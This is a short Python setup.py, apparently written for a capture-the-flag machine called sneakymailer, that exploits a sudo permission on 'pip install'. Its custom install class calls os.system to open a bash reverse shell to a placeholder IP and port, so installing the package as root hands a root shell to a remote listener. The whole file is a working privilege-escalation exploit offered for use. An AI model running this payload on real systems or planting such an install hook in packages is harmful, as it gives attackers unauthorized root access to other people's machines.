# Simple exploit sudo right on /usr/bin/pip install
# sudo /usr/bin/pip install . 

from setuptools import setup
from setuptools.command.install import install
import os

class h4ck(install):
    def run(self):
      install.run(self)	
      os.system("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'")

setup(
    name='Bad_Pip',
    description='Sudo is Dangerous :/',
    version='0.1',
    author='L',
    author_email='admin@sneakymailer.htb',
    cmdclass={'install':h4ck}
    )

